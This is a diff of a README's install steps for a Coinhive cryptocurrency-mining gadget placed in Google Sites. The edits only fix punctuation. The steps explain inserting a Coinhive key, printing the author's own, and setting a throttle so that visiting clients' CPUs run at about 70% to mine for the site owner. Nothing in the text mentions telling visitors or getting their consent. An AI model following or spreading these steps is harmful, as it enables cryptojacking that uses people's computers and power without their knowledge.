@@ -11,8 +11,8 @@ This is the Google Site I used for the pictures in the installation guide: [http
 # How to Install
 1. Download which gadget you want.
 2. Edit the XML file and replace the Coinhive Site Public key. Mine is: **M7RVhmPbPET48OxR5fLku1Xe2WkNo5w0**
-3. **Optional** Change the throttle value to increase or decrease the impact of the mining gadget on the clients computer. The default throttle is 0.3 which translates to 30%. With a throttle of 30% the clients CPU will be running at **70%**.
-4. Once you have your final XML file. Go to your Google Site dashboard and click on "Manage Site".
+3. **Optional** Change the throttle value to increase or decrease the impact of the mining gadget on the client's computer. The default throttle is 0.3 which translates to 30%. With a throttle of 30% the clients CPU will be running at **70%**.
+4. Once you have your final XML file, go to your Google Site dashboard and click on "Manage Site".
 
 ![Alt text](https://sites.google.com/site/unblockedhackedhalo/GithubCoinhiveStep1.JPG)
 
